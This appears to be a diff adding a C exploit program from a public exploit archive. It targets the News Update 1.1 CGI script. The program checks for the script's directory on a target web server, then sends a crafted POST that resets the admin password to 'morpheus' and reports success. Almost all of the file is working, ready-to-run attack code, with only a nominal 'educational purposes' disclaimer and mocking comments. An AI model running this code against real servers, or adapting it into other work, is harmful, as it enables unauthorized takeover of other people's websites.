@@ -1,0 +1,361 @@
+/***************************************************************************
+                          news_exp.c  -  description
+                             -------------------
+    begin                : Sat Oct 21 2000
+    copyright            : (C) 2000 by Morpheus[bd]
+    email                : morpheusbd@gmx.net
+    advisory		 : www.brightdarkness.de
+
+    Exploit code for the News Update 1.1 by Morpheus[bd]
+    For more information see my advisory which should be in this .tar.gz
+    package.
+
+    Compiling/Linking: gcc exploit.c -o exploit
+    Usage: will be printed when the exploit is started without arguments
+
+ ***************************************************************************/
+
+/***************************************************************************
+                         [Disclaimer]
+  Standard disclaimer applies here. Do not use this program. This program
+  is only for educational purposes. Use it on your on risk.
+
+ ***************************************************************************/
+
+/***************************************************************************
+ *                                                                         *
+ *   This program is free software; you can redistribute it and/or modify  *
+ *   it under the terms of the GNU General Public License as published by  *
+ *   the Free Software Foundation; either version 2 of the License, or     *
+ *   (at your option) any later version.                                   *
+ *                                                                         *
+ ***************************************************************************/
+
+#include <stdio.h>
+#include <string.h>
+#include <ctype.h>
+#include <stdlib.h>
+#include <netdb.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <signal.h>
+#include <arpa/nameser.h>
+#include <sys/stat.h>
+
+#define			WEISS		        printf("\033[0;29m")
+#define                 ROT                     printf("\033[1;31m")
+#define         	GRUEN                   printf("\033[1;32m")
+#define		        GELB                    printf("\033[1;33m")
+#define			BLAU		        printf("\033[1;34m")
+#define			LILA		        printf("\033[1;35m")
+#define         	HELLROT                 printf("\033[1;36m")
+
+#define MAXBUFFER       4096
+
+/******************* AUSGABEN ************************/
+
+/* At the moment everything will be written to the STDOUT */
+
+#define EXPLOIT_INFO		2 /* If you only want Exploit infos ... change it to 1 and DEBUG to 1 */
+#define	DEBUG_INFO		2 /* If you only want Debug infos ... change DEBUG to 2 */
+
+#define	DEBUG			2
+
+/*****************************************************/
+
+/* Standard-Pfad des News Update scripts */
+#define	NEWSUPDATE_PATH	"/cgi-bin/dummy/newsup"
+
+/* Name des News Update scripts */
+#define	NEWS_UPDATE	"newsup.pl"
+
+/* Das gew?schte Passwort f? die News Update Form */
+#define	PWD		"morpheus"
+
+/* HTTP-Request f? die News Update Form */
+#define	NEWS_UPDATE_PWD	"POST %s HTTP/1.0\r\n" \
+			"Host: %s\r\n" \
+			"Referrer: %s\r\n" \
+			"Connection: Close\r\n" \
+			"User-Agent: %s\r\n" \
+			"Accept: */*\r\n" \
+			"Content-type: application/x-www-urlencoded\r\n" \
+			"Content-length: %d\r\n" \
+			"\r\n" \
+			"pwd=%s&pwd2=%s&setpwd=++Set+Password++\r\n" \
+			"\r\n"
+
+/* Ein einfacher HTTP-Request um eine Datei von einem Web-Server zu saugen */
+#define SIMPLE_REQUEST	"GET %s HTTP/1.0\r\n" \
+			"Host: %s\r\n" \
+			"\r\n"
+
+#define BROWSER         "Morphi-Browser (X11; U; Linux 2.4 i686)"
+
+ssize_t writen(int fd, const void *vptr, size_t n)
+/* Taken from UNIX Network Programming - Vol. I by W.R. Stevens */
+  {
+    size_t nleft;
+    ssize_t nwritten;
+    const char *ptr;
+
+    ptr = vptr;
+    nleft = n;
+    while(nleft > 0) {
+      if ( (nwritten = write(fd, ptr, nleft)) <= 0) {
+        if (errno == EINTR)
+          nwritten = 0;
+        else
+          return (-1);
+      }
+      nleft -= nwritten;
+      ptr += nwritten;
+    }
+    return (n);
+  }
+
+static ssize_t my_read(int fd, char *ptr)
+/* Taken from UNIX Network Programming - Vol. I by W.R. Stevens */
+{
+	static int	read_cnt = 0;
+	static char	*read_ptr;
+	static char	read_buf[4096];
+
+	if (read_cnt <= 0) {
+again:
+		if ( (read_cnt = read(fd, read_buf, sizeof(read_buf))) < 0) {
+		  if (errno == EINTR)
+		    goto again;
+			return(-1);
+		} else if (read_cnt == 0)
+			return(0);
+		read_ptr = read_buf;
+	}
+
+	read_cnt--;
+	*ptr = *read_ptr++;
+	return(1);
+}
+
+ssize_t readline(int fd, void *vptr, size_t maxlen)
+/* Taken from UNIX Network Programming - Vol. I by W.R. Stevens */
+{
+	int		n, rc;
+	char	c, *ptr;
+
+	ptr = vptr;
+	for (n = 1; n < maxlen; n++) {
+		if ( (rc = my_read(fd, &c)) == 1) {
+			*ptr++ = c;
+			if (c == '\n')
+				break;	/* newline is stored, like fgets() */
+		} else if (rc == 0) {
+			if (n == 1)
+				return(0);	/* EOF, no data read */
+			else
+				break;		/* EOF, some data was read */
+		} else
+			return(-1);		/* error, errno set by read() */
+	}
+
+	*ptr = 0;	/* null terminate like fgets() */
+	return(n);
+}
+
+/* Stellt die Verbindung zum HTTP-Port des Servers her */
+int http_connection(char host[100])
+  {
+    struct sockaddr_in sa;
+    struct hostent *hp;
+
+    int sockfd;
+    int port = 80;
+
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    bzero(&sa, sizeof(sa));
+    sa.sin_family = AF_INET;
+    sa.sin_port = htons(port);
+    if ( (sa.sin_addr.s_addr = inet_addr(host)) == -1)
+      {
+        if ( (hp = (struct hostent *) gethostbyname(host)) == NULL)
+          {
+            ROT;
+            perror("gethostbyname:");
+            WEISS;
+            return (-1);
+          }
+        memcpy(&sa.sin_addr.s_addr,hp->h_addr,sizeof(hp->h_addr));
+      }
+
+    if (connect(sockfd, (struct sockaddr *) &sa, sizeof(sa)) < 0)
+      {
+        ROT;
+        perror("Connect:");
+        close(sockfd);
+        WEISS;
+        return (-1);
+      }
+    return sockfd;
+  }
+
+
+/* Exploited das News Update script und schleu? ein neues Password ein */
+int news_update_exploit(char *host, char *path)
+  {
+    int i = 0, sockfd = 0;
+    char cmd[MAXBUFFER];
+
+    if ((sockfd = http_connection(host)) == -1) { ROT; printf("Damn ... no connection to %s\n", host); WEISS; return; }
+
+    i = snprintf(cmd, sizeof(cmd), NEWS_UPDATE_PWD, path, host, "www.brightdarkness.de", BROWSER, 34 + strlen(PWD), PWD, PWD);
+    GELB;
+    if (DEBUG == DEBUG_INFO) { GELB; printf("Sending following request to %s[%d]:\n%s", host, 80, cmd); WEISS; }
+    WEISS;
+    if (writen(sockfd, cmd, i) == -1)
+      {
+        ROT;
+        printf("Man, man, man ....... Ihr verdammten Idioten .... kann man hier nicht mal in Ruhe writen() ?\n");
+        WEISS;
+        exit(-1);
+      }
+
+    GELB;
+    if (DEBUG == DEBUG_INFO) printf("Output from Server:\n");
+    WEISS;
+    while (readline(sockfd, cmd, MAXBUFFER) != 0)
+      {
+      	BLAU;
+      	if (DEBUG == DEBUG_INFO) printf("%s", cmd);
+      	WEISS;
+      	if (strstr(cmd, "Password Success") != NULL)
+      	  {
+      	    GRUEN;
+      	    if (DEBUG == EXPLOIT_INFO) printf("Exploit: Success!!!!\n");
+      	    if (DEBUG == EXPLOIT_INFO) printf("The new password: %s\n", PWD);
+      	    WEISS;
+      	    return (0);
+      	  }
+      }
+    ROT;
+    if (DEBUG == EXPLOIT_INFO) printf("Exploit: failed.\n");
+    WEISS;
+    return (-1);
+  }
+
+/* How to use this fucking lame proggy *rofl* */
+void usage(char *arg)
+  {
+    ROT;
+    printf("news_update_exploit - News Update Password Changer - v0.1\n");
+    printf("------------=====||| by Morpheus[bd] |||=====------------\n");
+    GELB;
+    printf("\nUsage:");
+    GRUEN;
+    printf("%s host/ip [path]\n\n", arg);
+    printf("path: alternative path to the newsup.pl\n");
+    WEISS;
+    exit(-1);
+  }
+
+/* Existiert das Verzeichnis der Form ?erhaupt ? */
+int check_directory(char *host, char *ptr)
+  {
+    int i = 0, sockfd = 0;
+    char cmd[MAXBUFFER], *ptr2;
+
+    ptr2 = ptr + strlen(ptr);
+    if (*(ptr2 - 1) != '/')
+      {
+        *ptr2 = '/';
+        *(ptr2 + 1) = '\0';
+      }
+
+    GELB;
+    if (DEBUG == DEBUG_INFO) printf("Checking if %s exists on the target server...\n", ptr);
+    WEISS;
+
+    if ((sockfd = http_connection(host)) == -1) { ROT; printf("Damn !!!... No connection to %s.\n", host); WEISS; return; }
+
+    i = snprintf(cmd, sizeof(cmd), SIMPLE_REQUEST, ptr, host);
+    GELB;
+    if (DEBUG == DEBUG_INFO) printf("Sending following request to %s[%d]:\n%s", host, 80, cmd);
+    WEISS;
+    if (writen(sockfd, cmd, i) == -1)
+      {
+        ROT;
+        printf("Man, man, man ....... Ihr verdammten Idioten .... kann man hier nicht mal in Ruhe writen() ?\n");
+        WEISS;
+        exit(-1);
+      }
+
+    if (readline(sockfd, cmd, MAXBUFFER) == 0)
+      {
+        ROT;
+        printf("Error: Reading from HTTP Server.\n");
+        WEISS;
+        exit(-1);
+      }
+    if (strstr(cmd, "404") == NULL)
+      {
+        GRUEN;
+        if (DEBUG == DEBUG_INFO) printf("The directory was found.\n");
+        WEISS;
+        while (readline(sockfd, cmd, MAXBUFFER) != 0);
+        close(sockfd);
+        return (0);
+      }
+
+    if (DEBUG == DEBUG_INFO) printf("The directory was NOT found.\n");
+    while (readline(sockfd, cmd, MAXBUFFER) != 0);
+    close(sockfd);
+    return (-1);
+  }
+
+/* Das tolle Hauptprogramm *fg* */
+int main(int argc, char **argv)
+ {
+   char buf[MAXBUFFER];
+
+   if (argc < 2)
+     {
+       usage(argv[0]);
+     }
+
+   if (argc >= 3)
+     {
+       /* Ein alternatives Verzeichnis wurde als Parameter ?ergeben */
+       strncpy(buf, argv[2], sizeof(buf));
+       if (check_directory(argv[1], buf) == -1)
+         {
+           ROT;
+           printf("Error: The given directory was not found.\nPlease provide a different directory.\n");
+           WEISS;
+           exit(-1);
+         }
+       strcat(buf, NEWS_UPDATE);
+     }
+   else
+     {
+       /* Kein alternatives Verz. angegeben, benutze Standard-Verzeichnis */
+       strncpy(buf, NEWSUPDATE_PATH, sizeof(buf));
+       if (check_directory(argv[1], buf) == -1)
+         {
+           ROT;
+           printf("Error: The given directory was not found.\nPlease provide a different directory.\n");
+           WEISS;
+           exit(-1);
+         }
+       strcat(buf, NEWS_UPDATE);
+    }
+
+   /* Let's rock !!!! */
+   news_update_exploit(argv[1], buf);
+   return (0);
+ }
+
+
+// milw0rm.com [2000-11-15]
